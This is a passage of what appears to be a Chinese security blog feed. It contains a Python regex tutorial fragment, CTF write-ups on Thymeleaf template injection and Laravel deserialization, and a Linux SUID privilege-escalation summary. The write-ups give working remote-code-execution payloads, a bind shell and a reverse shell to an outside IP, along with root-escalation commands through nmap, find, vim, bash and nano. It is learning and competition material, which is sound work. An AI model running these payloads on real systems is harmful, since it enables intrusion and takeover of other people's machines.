id="贪婪匹配"><a href="#贪婪匹配" class="headerlink" title="贪婪匹配"></a>贪婪匹配</h3><p>最后需要特别指出的是，正则匹配默认是贪婪匹配，也就是匹配尽可能多的字符。举例如下，匹配出数字后面的<code>0</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^(\d+)(0*)$&#x27;</span>, <span class="hljs-string">&#x27;102300&#x27;</span>).groups()<br>(<span class="hljs-string">&#x27;102300&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>由于<code>\d+</code>采用贪婪匹配，直接把后面的<code>0</code>全部匹配了，结果<code>0*</code>只能匹配空字符串了。</p><p>必须让<code>\d+</code>采用非贪婪匹配（也就是尽可能少匹配），才能把后面的<code>0</code>匹配出来，加个<code>?</code>就可以让<code>\d+</code>采用非贪婪匹配：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;^(\d+?)(0*)$&#x27;</span>, <span class="hljs-string">&#x27;102300&#x27;</span>).groups()<br>(<span class="hljs-string">&#x27;1023&#x27;</span>, <span class="hljs-string">&#x27;00&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>当我们在Python中使用正则表达式时，re模块内部会干两件事情：</p><ol><li>编译正则表达式，如果正则表达式的字符串本身不合法，会报错；</li><li>用编译后的正则表达式去匹配字符串。</li></ol><p>如果一个正则表达式要重复使用几千次，出于效率的考虑，我们可以预编译该正则表达式，接下来重复使用时就不需要编译这个步骤了，直接匹配：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> re<br><span class="hljs-comment"># 编译:</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>re_telephone = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;^(\d&#123;3&#125;)-(\d&#123;3,8&#125;)$&#x27;</span>)<br><span class="hljs-comment"># 使用：</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>re_telephone.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;010-12345&#x27;</span>).groups()<br>(<span class="hljs-string">&#x27;010&#x27;</span>, <span class="hljs-string">&#x27;12345&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>re_telephone.<span class="hljs-keyword">match</span>(<span class="hljs-string">&#x27;010-8086&#x27;</span>).groups()<br>(<span class="hljs-string">&#x27;010&#x27;</span>, <span class="hljs-string">&#x27;8086&#x27;</span>)<br></code></pre></td></tr></table></figure><p>编译后生成Regular Expression对象，由于该对象自己包含了正则表达式，所以调用对应的方法时不用给出正则字符串。</p><p>转载自：<a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664">https://www.liaoxuefeng.com/wiki/1016959663602400/1017639890281664</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/07/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/21/NepCTF%20Challenger%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/21/NepCTF%20Challenger%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="NepCTF-Challenger-Thymeleaf模板注入学习"><a href="#NepCTF-Challenger-Thymeleaf模板注入学习" class="headerlink" title="NepCTF Challenger Thymeleaf模板注入学习"></a>NepCTF Challenger Thymeleaf模板注入学习</h1><p>这道题是<code>Thymeleaf模板注入</code>的题目，以前没遇到过，现场学习了一波 </p><h2 id="Thymeleaf模板注入学习"><a href="#Thymeleaf模板注入学习" class="headerlink" title="Thymeleaf模板注入学习"></a>Thymeleaf模板注入学习</h2><p>参考：<a href="https://paper.seebug.org/1332/">https://paper.seebug.org/1332/</a></p><p><a href="https://xz.aliyun.com/t/9826">https://xz.aliyun.com/t/9826</a></p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境地址：<a href="https://github.com/veracode-research/spring-view-manipulation/">https://github.com/veracode-research/spring-view-manipulation/</a></p><p>我们以Springboot + Thymeleaf模板创建一个带有漏洞的项目</p><p>核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><span class="hljs-comment">//用户请求的url为path</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span><span class="hljs-comment">//参数名称为lang &#123;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>&#125;<br></code></pre></td></tr></table></figure><p>服务器通过Thymeleaf模板，然后去查找相关的模板文件</p><p>例如，用户通过get请求<code>/path?lang=hello</code>，则服务器去自动拼接待查找的模板文件名，为<code>resources/templates/user/hello/welcome.html</code>，并返回给用户的浏览器</p><p>由于找不到相关的内容，会直接报错</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220721155017.png"></p><h3 id="模板注入分析"><a href="#模板注入分析" class="headerlink" title="模板注入分析"></a>模板注入分析</h3><p>spring boot在<code>org.springframework.web.servlet.ModelAndView</code>方法中，开始处理用户的请求</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * This implementation expects the handler to be an &#123;@link HandlerMethod&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-variable">@Override</span><br><span class="hljs-variable">@Nullable</span><br>public final ModelAndView <span class="hljs-built_in">handle</span>(HttpServletRequest request, HttpServletResponse response, Object handler)<br>        throws Exception &#123;<br><br>    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">handleInternal</span>(request, response, (HandlerMethod) handler);<br>&#125;<br></code></pre></td></tr></table></figure><p>随后在<code>org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle</code>方法中，通过invokeForRequest函数，根据用户提供的url，调用相关的controller，并将其返回值，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Invoke the method and handle the return value through one of the</span><br><span class="hljs-comment"> * configured &#123;<span class="hljs-doctag">@link</span> HandlerMethodReturnValueHandler HandlerMethodReturnValueHandlers&#125;.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> webRequest the current request</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> mavContainer the ModelAndViewContainer for this request</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> providedArgs &quot;given&quot; arguments matched by type (not resolved)</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span><br><span class="hljs-params">        Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);<br>    setResponseStatus(webRequest);<br><br>    <span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="hljs-literal">null</span> || mavContainer.isRequestHandled()) &#123;<br>            disableContentCachingIfNecessary(webRequest);<br>            mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;<br>        mavContainer.setRequestHandled(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    mavContainer.setRequestHandled(<span class="hljs-literal">false</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-built_in">this</span>.returnValueHandlers.handleReturnValue(<br>                returnValue, getReturnValueType(returnValue), mavContainer, webRequest);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在函数中，调用<code>this.returnValueHandlers.handleReturnValue</code>去处理返回结果。最终在<code>org.springframework.web.servlet.mvc.method.annotation.ViewNameMethodReturnValueHandler#handleReturnValue</code>方法中，将controller返回值作为视图名称。代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType,</span><br><span class="hljs-params">        ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-keyword">if</span> (returnValue <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> returnValue.toString();<br>        mavContainer.setViewName(viewName);<br>        <span class="hljs-keyword">if</span> (isRedirectViewName(viewName)) &#123;<br>            mavContainer.setRedirectModelScenario(<span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>spring boot最终在<code>org.springframework.web.servlet.DispatcherServlet#processDispatchResult</code>方法中，调用Thymeleaf模板引擎的表达式解析。将上一步设置的视图名称为解析为模板名称，并加载模板，返回给用户。核心代码如下 <code>org.thymeleaf.standard.expression.IStandardExpressionParser#parseExpression</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">viewTemplateName</span> <span class="hljs-operator">=</span> getTemplateName();<br><span class="hljs-keyword">final</span> <span class="hljs-type">ISpringTemplateEngine</span> <span class="hljs-variable">viewTemplateEngine</span> <span class="hljs-operator">=</span> getTemplateEngine();<br><br><br><span class="hljs-keyword">final</span> <span class="hljs-type">IStandardExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> StandardExpressions.getExpressionParser(configuration);<br><br><span class="hljs-keyword">final</span> FragmentExpression fragmentExpression;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// By parsing it as a standard expression, we might profit from the expression cache</span><br>    fragmentExpression = (FragmentExpression) parser.parseExpression(context, <span class="hljs-string">&quot;~&#123;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (<span class="hljs-keyword">final</span> TemplateProcessingException e) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="View-Fragment-注入通用payload"><a href="#View-Fragment-注入通用payload" class="headerlink" title="View(Fragment) 注入通用payload"></a>View(Fragment) 注入通用payload</h3><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>如果这里的控制层用的是@Controller 进行注解的话，使用如下的payload 即可触发命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>).getInputStream()).next()&#125;__::.x<br><br>__$&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;touch executed&quot;</span>).getInputStream()).next()&#125;__::<br></code></pre></td></tr></table></figure><p>需要注意的是要进行urlencode编码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//ip:port/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x</span><br></code></pre></td></tr></table></figure><p>发送请求后执行id 命令后回显</p><p>虽然报错了，抛出的是fragment section 异常，但前面的代码已经执行完了才会到这一步</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220721155518.png"></p><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>如果Controller无返回值，则以GetMapping的路由为视图名称</p><p>在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞。例如我们可以控制document参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/doc/&#123;document&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getDocument</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String document)</span> &#123;<br>    log.info(<span class="hljs-string">&quot;Retrieving &quot;</span> + document);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">/doc/__$&#123;T(java.lang.Runtime).getRuntime().exec(<span class="hljs-string">&quot;touch executed&quot;</span>)&#125;__::.x<br></code></pre></td></tr></table></figure><h2 id="Challenger复现"><a href="#Challenger复现" class="headerlink" title="Challenger复现"></a>Challenger复现</h2><p>题目给了jar附件</p><p>拖到idea中打开，反编译</p><p>可以看到eval路由下存在lang变量可控，直接套通用</p><p><img src="C:\Users\kaife\AppData\Roaming\Typora\typora-user-images\image-20220721160650020.png" alt="image-20220721160650020"></p><p>payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">/eval?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat flag%<span class="hljs-number">22</span>).getInputStream()).next()%7d__::.<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220721081849.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/19/NepCTF%20Just%20Kidding%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/07/19/NepCTF%20Just%20Kidding%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="NepCTF-Just-Kidding复现"><a href="#NepCTF-Just-Kidding复现" class="headerlink" title="NepCTF Just Kidding复现"></a>NepCTF Just Kidding复现</h1><p>首先，访问容器地址，逛了一圈没看到啥东西，扫描发现存在源码泄露，访问<a href="http://www.zip得到源码/">www.zip得到源码</a></p><p>审计源码，找到反序列化的注入入口</p><p><img src="C:\Users\kaife\AppData\Roaming\Typora\typora-user-images\image-20220719174209207.png" alt="image-20220719174209207"></p><p>同时题目说了是Laravel的反序列化，然后就是上网找poc的过程了</p><p>在<code>Illuminate/Broadcasting/PendingBroadcast.php</code>中的<code>__destruct</code>方法中<code>$this-&gt;events</code>和<code>$this-&gt;event</code>均为可控</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220719174830.png"></p><p>并且，<code>Illuminate/Bus/Dispatcher.php</code>中的<code>dispatch</code>方法, 这里的<code>$command</code>和<code>$this-&gt;queueResolver</code>均是可控的</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220719175019.png"></p><p>参考：<a href="https://github.com/1nhann/vulns/issues">https://github.com/1nhann/vulns/issues</a></p><p>用第一条链子就可以打通</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220719170640.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/18/%E5%AF%B9LinuxSUID%E6%8F%90%E6%9D%83%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/"/>
    <url>/2022/07/18/%E5%AF%B9LinuxSUID%E6%8F%90%E6%9D%83%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="对Linux-SUID提权的一些总结"><a href="#对Linux-SUID提权的一些总结" class="headerlink" title="对Linux|SUID提权的一些总结"></a>对Linux|SUID提权的一些总结</h1><h2 id="SUID简介"><a href="#SUID简介" class="headerlink" title="SUID简介"></a>SUID简介</h2><p>通常来说，Linux运行一个程序，是使用当前运行这个程序的用户权限，这当然是合理的。但是有一些程序比较特殊，比如我们常用的ping命令</p><p><strong>suid</strong>即set user id，是一种授予文件的权限类型，它允许用户使用者以文件所有者的权限来执行文件</p><p>普通用户之所以也可以使用ping命令，原因就在我们给ping这个可执行文件设置了suid权限</p><p><img src="https://image.3001.net/images/20210512/1620789327_609b484f27571bf343436.jpg!small" alt="img"></p><p>设置SUID</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename   设置SUID位<br><span class="hljs-built_in">chmod</span> u-s filename   去掉SUID设置<br></code></pre></td></tr></table></figure><p>以下命令可以找出正在系统上运行的所有SUID可执行文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> -ldb &#123;&#125; ;<br></code></pre></td></tr></table></figure><p>以下所有的二进制文件都将以root权限运行 我们随便找一个</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220718112512.png"></p><p>可以看到其设置了suid权限，并且主权限为root</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220718112642.png"></p><h2 id="具体提权方法"><a href="#具体提权方法" class="headerlink" title="具体提权方法"></a>具体提权方法</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>适用版本:nmap2.02至5.21</p><p>在早期nmap版本中,带有交互模式,因而允许用户执行shell命令</p><p>使用如下命令进入nmap交互模式:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nmap --interactive<br></code></pre></td></tr></table></figure><p>在nmap交互模式中 通过如下命令提权</p><p><img src="https://raw.githubusercontent.com/Em4non/image-hosting/master/20220718113236.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">nmap&gt; !sh<br>sh-4.4<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>nmap提权失败可能出现的原因：</p><p>nmap版本过高，限制了suid权限</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>find一般用于在系统中查找文件，同时也有执行命令的能力，所以如果find为SUID权限运行，则通过find执行的命令也都将以root的身份去运行</p><p>提权如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#必须要有这个文件</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br></code></pre></td></tr></table></figure><p>也可以利用nc进行广播或者反弹shell</p><p>广播shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find user -<span class="hljs-built_in">exec</span> nc -lvp 4444 -e <span class="hljs-string">&#x27;/bin/sh&#x27;</span> \;<br></code></pre></td></tr></table></figure><p>在攻击机上:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc 靶机ip 4444<br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find anyfile -<span class="hljs-built_in">exec</span> bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/114.xxx.xxx.96/4444 0&gt;&amp;1&#x27;</span> \;<br></code></pre></td></tr></table></figure><p>在攻击机上:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 4444<br></code></pre></td></tr></table></figure><h3 id="Vim"><a href="#Vim" class="headerlink" title="Vim"></a>Vim</h3><p>用作编辑器，如果以SUID运行，可以读取并修改系统上所有文件</p><p>通过vim进入shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim.tiny<br><span class="hljs-comment">#vim命令</span><br>:<span class="hljs-built_in">set</span> shell = <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br>:shell<br></code></pre></td></tr></table></figure><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><p>以下命令将以root身份打开一个bash shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br>bash-3.2<span class="hljs-comment"># id</span><br>uid=1002(service) gid=1002(service) euid=0(root) <span class="hljs-built_in">groups</span>=1002(service)<br></code></pre></td></tr></table></figure><h3 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h3><p>nano进入shell的方法为</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">nano <span class="hljs-comment">#进入nano编辑器</span><br>Ctrl + R<br>Ctrl + X <br><span class="hljs-comment">#即可输入命令</span><br></code></pre></td></tr></table></figure><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h2><p>SUID提权由来已久,属于一种古早的提权技术,但其生命力经久不衰。</p><p>这要求管理员要仔细研究具有SUID权限的文件,不要给易被利用的文件以SUID权限,防止SUID的滥用导致黑客在进入服务器时轻易获取root权限。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/07/12/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202021%5DOne%20Pointer%20PHP/"/>
    <url>/2022/07/12/%5B%E8%93%9D%E5%B8%BD%E6%9D%AF%202021%5DOne%20Pointer%20PHP/</url>
    
    <content type="html"><![CDATA[<h1 id="蓝帽杯-2021-One-Pointer-PHP"><a href="#蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP"></a>[蓝帽杯 2021]One Pointer PHP</h1><p>在BUU上对这道题进行复现</p><p>打开环境，题目给了两个源码</p><p><code>add_api.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;user.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;data&quot;</span>]))&#123;<br><span class="hljs-variable">$count</span>[++<span class="hljs-variable">$user</span>-&gt;count]=<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$count</span>[]=<span class="hljs-number">1</span>)&#123;<br><span class="hljs-variable">$user</span>-&gt;count+=<span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;backdoor&quot;</span>]);<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$user</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>;<br><span class="hljs-variable">$user</span>-&gt;count=<span class="hljs-number">1</span>;<br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$count</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里首先是考察了一个PHP数组溢出的知识点，原理就是当传入的key等于php int类型数据的最大值时，想再插入一个更大的值就是出现Warning</p><p>关于PHP int类型最大值的参考文献如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PHP</span>的int型数据取值范围，与操作系统相关，<span class="hljs-number">32</span>位系统上为<span class="hljs-number">2</span>的<span class="hljs-number">31</span>次方，即-<span class="hljs-number">2147483648</span>到<span class="hljs-number">2147483647</span>，<span class="hljs-number">64</span>位系统上为<span class="hljs-number">2</span>的<span class="hljs-number">63</span>次方，即-<span class="hljs-number">9223372036854775808</span>到<span 